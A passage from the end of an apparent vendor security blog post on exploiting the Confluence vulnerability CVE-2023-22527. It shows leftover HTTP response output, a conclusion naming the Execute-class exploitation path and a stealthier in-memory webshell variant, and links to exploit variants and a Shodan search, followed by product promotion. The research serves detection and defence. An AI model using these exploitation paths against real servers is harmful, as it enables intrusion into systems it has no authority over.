authority\\network service \\n< X-Accel-Buffering: no\\n< Content-Type: text/html;charset=UTF-8\\n< Content-Language: en-US\\n< Transfer-Encoding: chunked\\n< Date: Tue, 05 Mar 2024 20:13:09 GMT\\n<\\n{ \[7656 bytes data\]\\n\* Connection #0 to host 10.9.49.76 left intact\\n\`\`\`\\n\\nAll of which has to be accounted for in the ruleset.\\n\\n## Conclusion\\n\\nThere's more than one way to reach Rome. While using \`freemarker.template.utility.Execute\` appears to be the popular way of exploiting CVE-2023-22527, other more stealthy paths generate different indicators. Of particular interest is the in-memory webshell, which had a pre-existing variant \*before\* we published this blog, and that variant appears to have been deployed \[in the wild\](https://www.shodan.io/search?query=%22X-Cmd-Result%22+%22X-Confluence-Request-Time%22). Defenders and attackers alike should consider \[these variants\](https://github.com/vulncheck-oss/cve-2023-22527/tree/main) (and how they apply to other OGNL attacks).\\n\\n\\n## About VulnCheck\\n\\nThe VulnCheck Initial Access team is always looking to advance the state of attack on initial access vulnerabilities like CVE-2023-22527. For more research like this, see our blogs, \[PaperCut Exploitation\](https://vulncheck.com/blog/papercut-rce) and \[Fileless Remote Code Execution on Juniper Firewalls\\n\](https://vulncheck.com/blog/juniper-cve-2023-36845)\\n\\nSign up to our website today to get free access to our \[VulnCheck KEV\](https://vulncheck.com/kev) and request a trial of our \[Initial Access Intelligence\](https://vulncheck.com/product/initial-access-intelligence) and \[Exploit & Vulnerability Intelligence\](https://vulncheck.com/product/exploit-intelligence) products.

#### [Source](https://vulncheck.com/blog/confluence-dreams-of-shells)

<br/>
---
